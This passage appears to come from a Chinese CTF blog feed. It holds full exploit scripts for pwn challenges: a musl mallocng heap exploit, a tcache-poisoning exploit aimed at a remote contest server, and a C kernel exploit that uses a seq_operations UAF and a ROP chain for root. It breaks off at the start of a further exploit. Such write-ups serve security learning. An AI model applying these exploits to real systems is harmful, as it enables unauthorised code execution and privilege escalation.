class="hljs-number">0x1d90</span><br>stdin = libc_base + <span class="hljs-number">0xad180</span><br>stdout = stdin + <span class="hljs-number">0x100</span><br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>malloc_context = libc_base + <span class="hljs-number">0xad9c0</span><br><span class="hljs-comment"># print(hex(elf_base))</span><br><span class="hljs-comment"># print(hex(libc_base))</span><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x4fc0</span>) + p64(malloc_context) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>find(<span class="hljs-number">0x20</span>, payload)<br>find(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x28:&#x27;</span>)<br>secret = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    secret += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br><br>heap_addr = libc_base - <span class="hljs-number">0x6000</span><br>fake_meta = heap_addr + <span class="hljs-number">0x1008</span><br>fake_group = heap_addr + <span class="hljs-number">0x1040</span><br><br><span class="hljs-comment">#这里是伪造meta，然后先让其queue</span><br>last_idx, freeable, sc, maplen = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x40</span>) <br>payload += p64(secret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_group) + p64(<span class="hljs-number">0</span>) <br>payload += p64((sc &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_meta) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x5fc0</span>) + p64(fake_group + <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x20</span>, payload)<br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br><br><span class="hljs-comment">#伪造的另一个meta,在dequeue后让其成为链表头，以后直接分配目标地址</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x580</span>) + p64(secret) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(stdin - <span class="hljs-number">0x10</span>)<br>payload += p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">3</span>) + p64((sc &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;g&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>delete(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x20</span>)<br><br><span class="hljs-comment">#利用先前伪造的meta已经queue,再去修改prev和next，然后利用dequeue攻击</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x50</span>) <br>payload += p64(secret) + p64(stdin - <span class="hljs-number">0x18</span>) + p64(heap_addr + <span class="hljs-number">0x2008</span>) + p64(fake_group) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p64((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">12</span>)|(sc &lt;&lt; <span class="hljs-number">6</span>)| (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">5</span>) | <span class="hljs-number">1</span>) + p64(fake_group - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_meta) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">0</span>)<br>find(<span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x6fb0</span>) + p64(fake_group + <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;h&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x20</span>, payload)<br><br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span> + p64(<span class="hljs-number">1</span>)  + p64(<span class="hljs-number">0</span>) + p64(sys_addr)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x80</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>​</p><p>参考：<a href="https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8">https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8</a></p><p><a href="https://blog.csdn.net/weixin_45209963/article/details/124423573">https://blog.csdn.net/weixin_45209963/article/details/124423573</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnhub3月公开赛&amp;&amp;内部赛</title>
    <link href="/2023/03/14/pwnhub3%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B&amp;&amp;%E5%86%85%E9%83%A8%E8%B5%9B/"/>
    <url>/2023/03/14/pwnhub3%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B&amp;&amp;%E5%86%85%E9%83%A8%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="sh-v1"><a href="#sh-v1" class="headerlink" title="sh_v1"></a>sh_v1</h1><p>漏洞在命令 <strong>ln</strong> 中，它会直接对堆地址复制，造成uaf。</p><p>解题思路：</p><ul><li>利用uaf，使用gedit修改已经释放的chunk中的key，然后double free。</li><li>修改tcache的next指针，使其指向tcache的头，修改0x290的数量为7，释放它就可以得到unsorted bin，进一步泄漏libc地址。</li><li>继续编辑tcache的头，修改0x210的数量为7，并在相应的位置写入__free_hook。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;sh_v1.1&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/x/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process(&#x27;./sh_v1.1&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">34883</span>) <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_command</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&gt;&#x27;</span>, content)<br><br>send_command(<span class="hljs-string">b&#x27;touch flag&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;touch flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br><br>send_command(<span class="hljs-string">b&#x27;ln flag flag1&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;ln flag flag2&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;gedit flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br><br>send_command(<span class="hljs-string">b&#x27;cat flag2&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>send_command(<span class="hljs-string">b&#x27;touch flag&#x27;</span>)<br>p.sendline(p64(heap_addr - <span class="hljs-number">0x290</span>))<br>send_command(<span class="hljs-string">b&#x27;touch flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>)<br>send_command(<span class="hljs-string">b&#x27;touch flag3&#x27;</span>)<br>p.sendline(payload)<br><br>send_command(<span class="hljs-string">b&#x27;ln flag3 flag4&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag3&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;cat flag4&#x27;</span>)<br>leak_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak_addr))<br>malloc_hook = leak_addr - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xf8</span> + p64(free_hook)<br>send_command(<span class="hljs-string">b&#x27;gedit flag4&#x27;</span>)<br>p.sendline(payload)<br><br>send_command(<span class="hljs-string">b&#x27;touch flag5&#x27;</span>)<br>p.sendline(p64(sys_addr))<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="kheap"><a href="#kheap" class="headerlink" title="kheap"></a>kheap</h1><p>攻击思路：</p><ol><li>使用0x10002这个选项时直接复制堆地址，释放堆块后select中存了堆地址，造成uaf。</li><li>使用seq_file，其正好会使用0x20大小的堆块，直接read就可以泄漏内核地址。</li><li>write修改seq_operations的内容，并给相应的寄存器复制构造ROP，最后调用read的系统调用。</li></ol><p>完整exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810ce710</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-number">0xffffffff810cebf0</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82c6b920</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span>;<br><br><span class="hljs-type">size_t</span> add_rsp_0x1a8_ret = <span class="hljs-number">0xffffffff817d1e76</span>;<br><span class="hljs-type">size_t</span> pop_rdi_ret = <span class="hljs-number">0xffffffff8102517a</span>;<br><span class="hljs-type">size_t</span> kernel_offset;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-type">int</span> kheap_fd, seq_fd;<br><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x10</span>];<br><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Status has been saved. \n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Process binded to core %d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_shell</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to get the root!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10000</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10001</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mov</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10002</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx , <span class="hljs-type">void</span> *buf)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span> =</span> &#123;idx, buf&#125;;<br>    ioctl(kheap_fd, <span class="hljs-number">0x6666</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br>    <br>    kheap_fd = open(<span class="hljs-string">&quot;/dev/kheap&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(kheap_fd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to open!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    add(<span class="hljs-number">0</span>);<br>    mov(<span class="hljs-number">0</span>);<br>    del(<span class="hljs-number">0</span>);<br><br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(seq_fd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to open!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    read(kheap_fd, buf, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_addr_is 0x%lx\n&quot;</span>, buf[<span class="hljs-number">0</span>]);<br>    kernel_offset = buf[<span class="hljs-number">0</span>] - <span class="hljs-number">0xffffffff8133f980</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_offset_is 0x%lx\n&quot;</span>, kernel_offset);<br>    buf[<span class="hljs-number">0</span>] = add_rsp_0x1a8_ret + kernel_offset;<br>    <br>    write(kheap_fd, buf, <span class="hljs-number">8</span>);<br><br>    pop_rdi_ret += kernel_offset;<br>    init_cred += kernel_offset;<br>    commit_creds += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode = swapgs_restore_regs_and_return_to_usermode + <span class="hljs-number">10</span> + kernel_offset;<br><br>    __asm__(<br>    <span class="hljs-string">&quot;mov r15,  0;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,  0;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,  pop_rdi_ret;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,  init_cred;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,  commit_creds;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,  swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>    <span class="hljs-string">&quot;xor rax,  rax;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,  8;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,  rsp;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,  seq_fd;&quot;</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ttsc"><a href="#ttsc" class="headerlink" title="ttsc"></a>ttsc</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ttsc&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./ttsc&#x27;)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    